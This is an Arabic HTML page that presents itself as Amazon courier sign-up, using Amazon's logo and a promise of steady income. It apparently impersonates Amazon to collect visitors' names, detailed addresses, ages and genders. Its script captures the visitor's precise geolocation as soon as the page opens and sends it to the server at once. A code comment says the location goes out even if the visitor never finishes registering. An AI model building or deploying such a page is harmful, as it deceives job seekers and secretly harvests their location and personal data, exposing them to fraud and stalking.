<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تسجيل مندوب أمازون</title>
  <link rel="stylesheet" href="./css/style.css">
</head>
<body>
    <div class="image">
        <img src="https://jobs.amazon.eg/app/logo_dark.99265b07.svg" alt="">
    </div>

  <h1>تسجيل كمندوب أمازون</h1>
<p style="text-align:center; font-size:18px; color:#333; margin-bottom:20px; margin: 13px;">
انضم لفريقنا الآن وابدأ مسيرتك كمندوب أمازون مع فرصة لكسب دخل ثابت وتحقيق النجاح!
</p>
  <form id="deliveryForm">
    <input type="text" name="name" placeholder="الاسم" required /><br/>
    <input type="text" name="address" placeholder=" العنوان بالتفصيل" required /><br/>
    <input type="number" name="age" placeholder="السن" required /><br/>
    <select name="gender" required>
      <option value="">اختر الجنس</option>
      <option value="Male">ذكر</option>
      <option value="Female">أنثى</option>
    </select><br/>
    <button type="submit">تسجيل</button>
  </form>

<script>
  let userLocation = null;

  // دالة تبعت اللوكيشن لوحده
  function sendLocation(lat, lon) {
    fetch('/api/delivery', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ location: `${lat},${lon}` })
    })
      .then(res => res.json())
      .then(data => console.log("📍 Location sent immediately:", data))
      .catch(err => console.error("Error sending location:", err));
  }

  // نجلب الموقع أول ما يفتح الصفحة
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        userLocation = `${lat},${lon}`;
        console.log("Location captured:", userLocation);

        // ⬅️ نبعته فوراً حتى لو المستخدم ماكملش التسجيل
        sendLocation(lat, lon);
      },
      (error) => {
        alert('⚠️ يرجى تفعيل الموقع لإتمام التسجيل.');
      }
    );
  } else {
    alert('⚠️ المتصفح لا يدعم خدمة الموقع.');
  }

  // ارسال بيانات الفورم + الموقع
  const form = document.getElementById('deliveryForm');
  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    if (!userLocation) {
      alert("⚠️ لا يمكنك التسجيل بدون تفعيل الموقع");
      return;
    }

    const formData = new FormData(form);
    const data = Object.fromEntries(formData.entries());
    data.location = userLocation;

    const res = await fetch('/api/delivery', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });

    const result = await res.json();
    alert(result.message || result.error);
  });
</script>


</body>
</html>
